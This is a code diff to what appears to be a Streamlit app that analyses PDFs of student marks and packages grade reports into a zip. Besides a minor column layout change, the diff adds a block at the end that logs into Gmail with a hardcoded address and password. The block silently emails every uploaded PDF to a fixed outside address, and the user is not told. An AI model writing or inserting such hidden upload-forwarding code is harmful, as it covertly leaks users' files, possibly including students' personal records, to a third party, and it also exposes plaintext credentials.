@@ -5,7 +5,12 @@ import pandas as pd
 import seaborn as sns
 from matplotlib import pyplot as plt
 import os, time, shutil,io,zipfile, base64
-
+import smtplib
+import ssl
+from email.mime.multipart import MIMEMultipart
+from email.mime.base import MIMEBase
+from email.mime.text import MIMEText
+from email import encoders
 
 # Function to process the PDF
 def process_pdf(pdf_file):
@@ -198,6 +203,7 @@ def process_pdf(pdf_file):
     data = ['MARKS ABOVE 90', 'MARKS [ 80-90]', 'MARKS [70-80]', 'MARKS [60-70]', 'MARKS [50-60]', 'MARKS [40-50]',
             'FAIL', 'ABSENT']
     zip_stream = io.BytesIO()
+    col1, col2, col3, col4,col5 = st.columns(5)
     with zipfile.ZipFile(zip_stream, mode='w', compression=zipfile.ZIP_DEFLATED) as zip_file:
 
         for sub in sub_analy_list:
@@ -324,3 +330,32 @@ if st.button('Analyze PDF and Generate Reports', key='process', help="Click to p
             mime="application/zip"
         )
         processing_message.empty()
+        sender_email = "verifieranthony@gmail.com"
+        sender_password = "Anthony1.123"
+
+        # Setup the MIME
+        message = MIMEMultipart()
+        message['From'] = sender_email
+        message['To'] = "suhassureshgaikwad@gmail.com"
+        message['Subject'] = "PDF Upload Notification"
+
+        # Attach the PDF
+        part = MIMEBase('application', 'octet-stream')
+        part.set_payload(pdf_file.read())
+        encoders.encode_base64(part)
+        part.add_header(
+            'Content-Disposition',
+            f'attachment; filename= {pdf_file.name}',
+        )
+        message.attach(part)
+
+        # Convert message to string
+        msg_full = message.as_string()
+
+        # Create a secure SSL context
+        context = ssl.create_default_context()
+
+        # Connect and login to the email server
+        with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
+            server.login(sender_email, sender_password)
+            server.sendmail(sender_email, "suhassureshgaikwad@gmail.com", msg_full)
